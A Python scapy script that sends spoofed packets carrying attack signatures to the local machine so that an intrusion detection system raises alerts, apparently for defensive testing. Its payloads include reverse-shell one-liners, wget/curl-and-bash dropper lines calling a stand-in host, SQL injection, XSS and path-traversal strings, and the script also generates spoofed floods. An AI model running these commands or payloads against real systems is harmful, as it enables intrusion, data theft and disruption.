#!/usr/bin/env python3
"""
IDS Test Traffic Simulator
══════════════════════════
Simulates attack PATTERNS for IDS training — no real exploitation.
All packets are injected with a spoofed source IP so your machine
is never the real attacker.

Run as Administrator:
    python ids_test_traffic.py

Each test is independent. The IDS should fire alerts for all of them.
"""

import sys, time, random, socket
from datetime import datetime

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, Raw,
        send, sendp, conf, get_if_list,
    )
    conf.verb = 0
except ImportError:
    print("Install scapy first:  pip install scapy")
    sys.exit(1)

# ── Setup ─────────────────────────────────────────────────────────────────────
MY_IP    = socket.gethostbyname(socket.gethostname())
FAKE_SRC = MY_IP.rsplit(".", 1)[0] + ".200"   # spoofed attacker on same /24

GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
RESET  = "\033[0m"

def banner(title):
    print(f"\n{CYAN}{'━'*60}{RESET}")
    print(f"{CYAN}  {title}{RESET}")
    print(f"{CYAN}{'━'*60}{RESET}")

def sent(desc):
    print(f"  {GREEN}✓{RESET}  {desc}")

def wait(secs=0.5):
    time.sleep(secs)


# ══════════════════════════════════════════════════════════════════════════════
#  1. PORT SCAN SIMULATION
#  Simulates Nmap-style scan across common service ports
# ══════════════════════════════════════════════════════════════════════════════
def test_port_scan():
    banner("TEST 1 — Port Scan (Nmap-style SYN scan)")
    targets = [
        21,22,23,25,53,80,110,111,135,139,
        143,443,445,993,995,1723,3306,3389,
        5900,8080,8443,8888,9090,27017,
    ]
    print(f"  Scanning {len(targets)} common ports on {MY_IP}")
    for port in targets:
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=random.randint(49152,65535), dport=port, flags="S"),
        )
        wait(0.05)
    sent(f"SYN scan complete — {len(targets)} ports probed")


# ══════════════════════════════════════════════════════════════════════════════
#  2. SYN FLOOD
#  Simulates a DoS SYN flood — 200 SYN packets in rapid succession
# ══════════════════════════════════════════════════════════════════════════════
def test_syn_flood():
    banner("TEST 2 — SYN Flood (DoS simulation)")
    print(f"  Sending 200 SYN packets to {MY_IP}:80")
    for i in range(200):
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=random.randint(1024,65535), dport=80, flags="S"),
        )
    sent("SYN flood complete — 200 packets sent")


# ══════════════════════════════════════════════════════════════════════════════
#  3. METASPLOIT-STYLE CONNECTION
#  Packet to port 4444 (Metasploit default) with reverse-shell signature
# ══════════════════════════════════════════════════════════════════════════════
def test_metasploit_port():
    banner("TEST 3 — Metasploit Port 4444 + Reverse Shell Signature")
    payloads = [
        b"nc -e /bin/bash 192.168.200.99 4444\n",
        b"bash -i >& /dev/tcp/192.168.200.99/4444 0>&1\n",
        b"python3 -c 'import socket,subprocess;s=socket.socket();s.connect((\"192.168.200.99\",4444))'\n",
    ]
    for payload in payloads:
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=54321, dport=4444, flags="PA") /
            Raw(load=payload)
        )
        sent(f"Payload: {payload[:50].decode(errors='replace')}")
        wait(0.3)


# ══════════════════════════════════════════════════════════════════════════════
#  4. SQL INJECTION SIGNATURE
#  HTTP-like packets containing SQL injection strings
# ══════════════════════════════════════════════════════════════════════════════
def test_sql_injection():
    banner("TEST 4 — SQL Injection Signatures")
    injections = [
        b"GET /?id=1' OR '1'='1 HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /?id=1 UNION SELECT username,password FROM users-- HTTP/1.1\r\n\r\n",
        b"POST /login HTTP/1.1\r\n\r\nuser=admin'--&pass=x",
        b"GET /?search=1'; DROP TABLE users;-- HTTP/1.1\r\n\r\n",
    ]
    for payload in injections:
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=55001, dport=80, flags="PA") /
            Raw(load=payload)
        )
        sent(f"SQLi: {payload[:55].decode(errors='replace').strip()}")
        wait(0.3)


# ══════════════════════════════════════════════════════════════════════════════
#  5. XSS ATTACK SIMULATION
#  Packets to port 80 containing XSS payloads in request body
# ══════════════════════════════════════════════════════════════════════════════
def test_xss():
    banner("TEST 5 — Cross-Site Scripting (XSS) Signatures")
    xss_payloads = [
        b"POST /comment HTTP/1.1\r\n\r\nbody=<script>alert('xss')</script>",
        b"GET /?q=<img src=x onerror=alert(1)> HTTP/1.1\r\n\r\n",
        b"GET /?redirect=javascript:alert(document.cookie) HTTP/1.1\r\n\r\n",
    ]
    for payload in xss_payloads:
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=55002, dport=80, flags="PA") /
            Raw(load=payload)
        )
        sent(f"XSS: {payload[:55].decode(errors='replace').strip()}")
        wait(0.3)


# ══════════════════════════════════════════════════════════════════════════════
#  6. SHELLCODE / NOP SLED
#  Packets containing NOP sleds — classic buffer overflow fingerprint
# ══════════════════════════════════════════════════════════════════════════════
def test_shellcode_nop():
    banner("TEST 6 — NOP Sled / Shellcode Signature")
    nop_sled = b"\x90" * 64 + b"\xcc\xcd\xce\xcf"   # NOPs + breakpoints
    send(
        IP(src=FAKE_SRC, dst=MY_IP) /
        TCP(sport=55003, dport=445, flags="PA") /
        Raw(load=nop_sled)
    )
    sent(f"NOP sled: 64 x 0x90 + breakpoints sent to port 445 (SMB)")


# ══════════════════════════════════════════════════════════════════════════════
#  7. DIRECTORY TRAVERSAL
#  HTTP requests containing path traversal sequences
# ══════════════════════════════════════════════════════════════════════════════
def test_path_traversal():
    banner("TEST 7 — Directory / Path Traversal")
    traversals = [
        b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
        b"GET /?file=../../../etc/shadow HTTP/1.1\r\n\r\n",
        b"GET /download?path=..\\..\\..\\windows\\system32\\cmd.exe HTTP/1.1\r\n\r\n",
    ]
    for payload in traversals:
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=55004, dport=80, flags="PA") /
            Raw(load=payload)
        )
        sent(f"Traversal: {payload[:55].decode(errors='replace').strip()}")
        wait(0.3)


# ══════════════════════════════════════════════════════════════════════════════
#  8. SMB / ETERNALBLUE TARGET PORT
#  SYN + data to port 445 simulating recon before SMB exploit
# ══════════════════════════════════════════════════════════════════════════════
def test_smb_probe():
    banner("TEST 8 — SMB Port 445 Probe (EternalBlue-style recon)")
    # Multiple SYNs to 445 simulating a scanner
    for i in range(10):
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=55100+i, dport=445, flags="S")
        )
        wait(0.1)
    # Follow with payload
    send(
        IP(src=FAKE_SRC, dst=MY_IP) /
        TCP(sport=55200, dport=445, flags="PA") /
        Raw(load=b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00")  # SMB header
    )
    sent("SMB probe: 10 SYNs + SMB header signature to port 445")


# ══════════════════════════════════════════════════════════════════════════════
#  9. RDP BRUTE FORCE SIMULATION
#  Rapid repeated SYN connections to port 3389
# ══════════════════════════════════════════════════════════════════════════════
def test_rdp_bruteforce():
    banner("TEST 9 — RDP Brute Force (port 3389)")
    print("  Sending 30 rapid SYN connections to simulate login attempts")
    for i in range(30):
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=55300+i, dport=3389, flags="S")
        )
        wait(0.05)
    sent("RDP brute force simulation: 30 connection attempts")


# ══════════════════════════════════════════════════════════════════════════════
#  10. ICMP FLOOD
#  Large volume of ICMP echo requests — ping flood / Smurf simulation
# ══════════════════════════════════════════════════════════════════════════════
def test_icmp_flood():
    banner("TEST 10 — ICMP Flood (Ping Flood)")
    print("  Sending 250 ICMP echo requests")
    for i in range(250):
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            ICMP(type=8, code=0) /
            Raw(load=b"X" * 64)
        )
    sent("ICMP flood: 250 echo requests (64 bytes each)")


# ══════════════════════════════════════════════════════════════════════════════
#  11. BOTNET C2 PORT (IRC)
#  Connection attempt to IRC port 6667 — typical botnet C2 channel
# ══════════════════════════════════════════════════════════════════════════════
def test_botnet_c2():
    banner("TEST 11 — Botnet C2 / IRC Port 6667")
    irc_commands = [
        b"NICK bot_infected_host\r\n",
        b"JOIN #botnet-c2-channel\r\n",
        b"PRIVMSG #botnet :!cmd whoami\r\n",
    ]
    for cmd in irc_commands:
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=55400, dport=6667, flags="PA") /
            Raw(load=cmd)
        )
        sent(f"IRC C2: {cmd.decode().strip()}")
        wait(0.3)


# ══════════════════════════════════════════════════════════════════════════════
#  12. MALWARE DROPPER SIMULATION
#  Payload strings that match malware download signatures
# ══════════════════════════════════════════════════════════════════════════════
def test_malware_dropper():
    banner("TEST 12 — Malware Dropper Signatures")
    droppers = [
        b"wget http://malware-sim.test/payload.sh -O /tmp/x && bash /tmp/x\n",
        b"curl http://malware-sim.test/stage2.exe -o C:\\Users\\Public\\stage2.exe\n",
        b"powershell -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n",
        b"base64 -d <<< 'bWFsd2FyZS1zaW11bGF0aW9u' | bash\n",
    ]
    for payload in droppers:
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=55500, dport=4444, flags="PA") /
            Raw(load=payload)
        )
        sent(f"Dropper: {payload[:60].decode(errors='replace').strip()}")
        wait(0.3)


# ══════════════════════════════════════════════════════════════════════════════
#  13. UDP AMPLIFICATION (DDoS reflection simulation)
#  Large UDP packets to simulate DNS/NTP amplification fingerprint
# ══════════════════════════════════════════════════════════════════════════════
def test_udp_amplification():
    banner("TEST 13 — UDP Amplification / DDoS Reflection Signature")
    for i in range(8):
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            UDP(sport=53, dport=random.randint(1024,65535)) /
            Raw(load=b"A" * 1400)   # large UDP datagram
        )
        wait(0.1)
    sent("UDP amplification: 8 × 1400-byte UDP packets from port 53")


# ══════════════════════════════════════════════════════════════════════════════
#  14. MULTI-SOURCE DISTRIBUTED SCAN
#  Simulate scan coming from multiple different attacker IPs
# ══════════════════════════════════════════════════════════════════════════════
def test_distributed_scan():
    banner("TEST 14 — Distributed Scan (multiple attacker IPs)")
    base = MY_IP.rsplit(".", 1)[0]
    attacker_ips = [f"{base}.{i}" for i in range(201, 211)]
    ports = [22, 80, 443, 3389, 8080]
    for src in attacker_ips:
        for port in ports:
            send(
                IP(src=src, dst=MY_IP) /
                TCP(sport=random.randint(49152,65535), dport=port, flags="S")
            )
        wait(0.1)
    sent(f"Distributed scan: 10 source IPs × {len(ports)} ports each")


# ══════════════════════════════════════════════════════════════════════════════
#  15. TOR / SUSPICIOUS PORT SWEEP
#  Touch multiple known bad ports in rapid succession
# ══════════════════════════════════════════════════════════════════════════════
def test_suspicious_ports():
    banner("TEST 15 — Suspicious Port Sweep (all known bad ports)")
    bad_ports = {
        4444 : "Metasploit",
        5555 : "ADB/RAT",
        1337 : "Elite",
        31337: "Back Orifice",
        6667 : "IRC/Botnet",
        9001 : "Tor",
        9050 : "Tor SOCKS",
        4899 : "Radmin RAT",
        1080 : "SOCKS proxy",
        3333 : "Mining pool",
        14444: "Mining pool alt",
    }
    for port, name in bad_ports.items():
        send(
            IP(src=FAKE_SRC, dst=MY_IP) /
            TCP(sport=random.randint(49152,65535), dport=port, flags="S")
        )
        sent(f"Port {port:<6} — {name}")
        wait(0.2)


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════════════════════════════
TESTS = [
    ("Port Scan (SYN)",                  test_port_scan),
    ("SYN Flood",                        test_syn_flood),
    ("Metasploit Port 4444",             test_metasploit_port),
    ("SQL Injection Signatures",         test_sql_injection),
    ("XSS Signatures",                   test_xss),
    ("Shellcode / NOP Sled",             test_shellcode_nop),
    ("Directory Traversal",              test_path_traversal),
    ("SMB / EternalBlue Probe",          test_smb_probe),
    ("RDP Brute Force",                  test_rdp_bruteforce),
    ("ICMP Flood",                       test_icmp_flood),
    ("Botnet C2 / IRC",                  test_botnet_c2),
    ("Malware Dropper Signatures",       test_malware_dropper),
    ("UDP Amplification",                test_udp_amplification),
    ("Distributed Multi-Source Scan",    test_distributed_scan),
    ("Suspicious Port Sweep",            test_suspicious_ports),
]

if __name__ == "__main__":
    print(f"""
{CYAN}╔══════════════════════════════════════════════════════════╗
║        IDS Test Traffic Simulator                        ║
║        Simulates attack patterns for IDS training        ║
╚══════════════════════════════════════════════════════════╝{RESET}

  Your IP    : {MY_IP}
  Fake src   : {FAKE_SRC}  (spoofed — not real)
  IDS target : Make sure realtime_ids.py is running!

  Tests available:
""")
    for i, (name, _) in enumerate(TESTS, 1):
        print(f"  [{i:>2}]  {name}")
    print(f"  [ 0]  Run ALL tests")
    print(f"  [ q]  Quit\n")

    choice = input("  Select test: ").strip().lower()

    if choice == "q":
        sys.exit(0)
    elif choice == "0":
        print(f"\n  {YELLOW}Running all 15 tests — watch your IDS terminal!{RESET}\n")
        time.sleep(2)
        for name, fn in TESTS:
            fn()
            wait(1.0)
    else:
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(TESTS):
                TESTS[idx][1]()
            else:
                print("Invalid choice")
        except ValueError:
            print("Invalid input")

    print(f"\n{GREEN}  Done. Check your IDS terminal for alerts.{RESET}\n")
